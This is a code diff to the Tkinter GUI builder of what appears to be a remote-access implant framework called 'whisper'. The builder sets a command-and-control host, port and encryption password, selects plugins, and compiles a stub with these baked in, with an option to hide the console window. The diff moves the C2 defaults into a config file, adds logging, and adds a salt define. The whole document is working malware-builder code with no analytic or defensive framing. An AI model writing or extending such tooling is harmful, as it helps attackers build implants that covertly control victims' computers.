@@ -1,10 +1,15 @@
 import tkinter as tk
 from tkinter import ttk, filedialog, messagebox, scrolledtext
-import os, sys, subprocess, threading, webbrowser
+import os, sys, subprocess, threading, webbrowser, logging
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from plugins import PLUGIN_REGISTRY, get_info
 from stub_generator import generate_stub, estimate_size
+from whisper_logging import setup_logger, TkinterHandler
+from whisper_config import load_config
+
+LOG_NAMESPACE = "whisper.builder"
+log = logging.getLogger(LOG_NAMESPACE)
 
 DARK_BG = "#1a1a2e"; DARKER_BG = "#16213e"; ACCENT = "#e94560"
 TEXT_FG = "#e0e0e0"; TEXT_SEC = "#a0a0a0"; GREEN = "#00ff88"; FONT = ("Consolas", 10)
@@ -14,7 +19,6 @@ def find_pyinstaller():
     for p in os.environ.get("PATH", "").split(os.pathsep):
         for n in ("pyinstaller.exe", "pyinstaller", "pyinstaller.bat"):
             if os.path.isfile(os.path.join(p, n)): return os.path.join(p, n)
-    # Fallback: try running via python -m PyInstaller
     try:
         r = subprocess.run([sys.executable, "-m", "PyInstaller", "--version"],
                            capture_output=True, text=True, timeout=10)
@@ -35,6 +39,7 @@ class BuilderApp:
         else:
             self.root = master
             self.own_root = False
+        self.config = load_config()
         self.plugin_vars = {}
         self._build_ui()
 
@@ -56,10 +61,10 @@ class BuilderApp:
         # --- C2 config ---
         cf = tk.LabelFrame(main, text="C2 Configuration", bg=DARK_BG, fg=TEXT_FG, font=FONT)
         cf.pack(fill="x", pady=3)
-        self._add_field(cf, "C2 Host / IP:", 0, "127.0.0.1")
-        self._add_field(cf, "C2 Port:", 1, "4443")
-        self._add_field(cf, "Encryption Password:", 2, "whisper_secret_key")
-        self._add_field(cf, "Reconnect Delay (s):", 3, "10")
+        self._add_field(cf, "C2 Host / IP:", 0, self.config.builder_default_host)
+        self._add_field(cf, "C2 Port:", 1, str(self.config.builder_default_port))
+        self._add_field(cf, "Encryption Password:", 2, self.config.c2_password or "whisper_secret_key")
+        self._add_field(cf, "Reconnect Delay (s):", 3, str(self.config.reconnect_delay))
 
         # --- Plugins ---
         pf = tk.LabelFrame(main, text="Plugins", bg=DARK_BG, fg=TEXT_FG, font=FONT)
@@ -128,7 +133,9 @@ class BuilderApp:
         if not hasattr(self, "_entries"): self._entries = {}
         self._entries[label] = e
 
-    def _log(self, msg): self.log.configure(state="normal"); self.log.insert("end", msg + "\n"); self.log.see("end"); self.log.configure(state="disabled"); self.root.update()
+    def _log(self, msg):
+        log.info(msg)
+        self.log.configure(state="normal"); self.log.insert("end", msg + "\n"); self.log.see("end"); self.log.configure(state="disabled"); self.root.update()
 
     def _browse(self):
         d = filedialog.askdirectory(initialdir=self.output_dir.get())
@@ -240,11 +247,14 @@ class BuilderApp:
                 self._log("[!] No C compiler found. Install MinGW or MSVC.")
                 return
             cfg = self._get_cfg()
+            salt_hex = self.config.c2_salt_hex
             if msvc:
                 args = [cc, "/O1", "/GS-", f"/Fe{out_exe}", c_path,
                         f"/DC2_HOST=\"{cfg['host']}\"",
                         f"/DC2_PORT={cfg['port']}",
                         f"/DC2_PASS=\"{cfg['password']}\""]
+                if salt_hex:
+                    args.insert(5, f"/DC2_SALT=\"{salt_hex}\"")
                 if self.var_noconsole.get(): args.append("/link")
                 args += ["ws2_32.lib", "bcrypt.lib", "advapi32.lib"]
             else:
@@ -252,6 +262,8 @@ class BuilderApp:
                         f'-DC2_HOST="{cfg["host"]}"',
                         f'-DC2_PORT={cfg["port"]}',
                         f'-DC2_PASS="{cfg["password"]}"']
+                if salt_hex:
+                    args.insert(5, f'-DC2_SALT="{salt_hex}"')
                 if self.var_noconsole.get(): args.append("-mwindows")
                 args += ["-lws2_32", "-lbcrypt", "-ladvapi32"]
             self._log(f"[*] Compiling with {cc}...")
